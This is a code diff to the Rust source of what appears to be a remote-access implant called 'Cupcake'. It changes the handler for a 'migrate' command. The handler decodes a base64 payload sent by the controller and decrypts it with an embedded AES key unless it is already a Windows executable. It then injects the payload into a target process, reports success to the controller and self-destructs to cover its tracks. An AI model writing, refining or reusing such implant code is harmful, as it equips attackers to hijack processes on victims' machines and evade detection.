@@ -590,10 +590,10 @@ impl MessageHandler {
             "migrate" => {
                 // 🚀 ADVANCED MIGRATION (Loader V2 - Section Mapping / File Sealing)
                 info!("[*] Initiating advanced migration session...");
-                
                 // 1. Resolve Target and Payload
                 let target_str = command_payload.command_content.trim();
                 let payload_b64 = command_payload.data.as_deref().unwrap_or("");
+                println!("[!] Migration command received. Payload size: {} bytes", payload_b64.len());
                 
                 let payload = match base64::engine::general_purpose::STANDARD.decode(payload_b64.trim()) {
                     Ok(data) => data,
@@ -603,11 +603,22 @@ impl MessageHandler {
                     }
                 };
 
-                // 2. JIT Decryption
-                let key = crate::config::get_aes_key();
-                let data = match crate::crypto::decrypt(&payload, &key) {
-                    Ok(decrypted) => decrypted,
-                    Err(_) => payload,
+                // 2. JIT Decryption (Only if not already a plain PE)
+                let data = if payload.len() > 2 && &payload[0..2] == b"MZ" {
+                    debug!("[Cupcake] Payload has MZ header, skipping decryption.");
+                    payload
+                } else {
+                    let key = crate::config::get_aes_key();
+                    match crate::crypto::decrypt(&payload, &key) {
+                        Ok(decrypted) => {
+                            debug!("[Cupcake] Migration payload decrypted successfully.");
+                            decrypted
+                        },
+                        Err(_) => {
+                            warn!("[!] Decryption failed, using raw payload.");
+                            payload
+                        },
+                    }
                 };
 
                 let target_name = if target_str.is_empty() { None } else { Some(target_str) };
@@ -619,13 +630,19 @@ impl MessageHandler {
                 match status {
                     crate::loader::MigrationStatus::Success => {
                         info!("Migration successful, triggering self-destruct...");
-                        let _ = crate::injection::ProcessInjector::self_destruct().await;
-                        CommandResult {
+                        let success_res = CommandResult {
                             stdout: format!("[+] Migration successful to: {}", target_str),
                             stderr: String::new(),
                             path: None,
                             req_id: command_payload.req_id.clone(),
-                        }
+                        };
+                        // Send success message first
+                        let _ = self.send_message(&success_res.to_response_message()).await;
+                        // Brief wait to ensure message delivery
+                        tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
+                        // Then self destruct
+                        let _ = crate::injection::ProcessInjector::self_destruct().await;
+                        return Ok(()); // Handled manually
                     },
                     _ => CommandResult {
                         stdout: String::new(),
